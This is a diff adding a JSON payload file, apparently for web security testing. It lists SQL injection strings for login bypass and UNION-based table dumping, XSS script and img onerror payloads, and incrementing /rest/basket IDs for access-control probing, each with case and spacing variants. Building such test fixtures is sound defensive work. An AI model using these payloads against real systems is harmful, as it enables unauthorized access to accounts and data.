@@ -1,0 +1,63 @@
+{
+  "payloads": [
+    {
+      "vector_id": "VEC-001",
+      "original": "' OR 1=1--",
+      "variants": [
+        "' OR 1=1 --",
+        "' OR '1'='1'--",
+        "' OR 1=1#",
+        "'  OR  1=1--",
+        "' or 1=1--"
+      ]
+    },
+    {
+      "vector_id": "VEC-001",
+      "original": "admin'--",
+      "variants": [
+        "admin' --",
+        "admin'/*",
+        "ADMIN'--",
+        "admin' #"
+      ]
+    },
+    {
+      "vector_id": "VEC-001",
+      "original": "' UNION SELECT * FROM Users--",
+      "variants": [
+        "' UNION SELECT * FROM Users --",
+        "' union select * from Users--",
+        "' UNION ALL SELECT * FROM Users--"
+      ]
+    },
+    {
+      "vector_id": "VEC-002",
+      "original": "<script>alert('xss')</script>",
+      "variants": [
+        "<script>alert(1)</script>",
+        "<SCRIPT>alert('xss')</SCRIPT>",
+        "<script>alert`xss`</script>",
+        "<script>alert(String.fromCharCode(88,83,83))</script>"
+      ]
+    },
+    {
+      "vector_id": "VEC-002",
+      "original": "<img src=x onerror=alert(1)>",
+      "variants": [
+        "<img src=x onerror='alert(1)'>",
+        "<IMG SRC=x ONERROR=alert(1)>",
+        "<img/src=x onerror=alert(1)>"
+      ]
+    },
+    {
+      "vector_id": "VEC-003",
+      "original": "/rest/basket/2",
+      "variants": [
+        "/rest/basket/3",
+        "/rest/basket/4",
+        "/rest/basket/5",
+        "/rest/basket/100"
+      ]
+    }
+  ]
+}
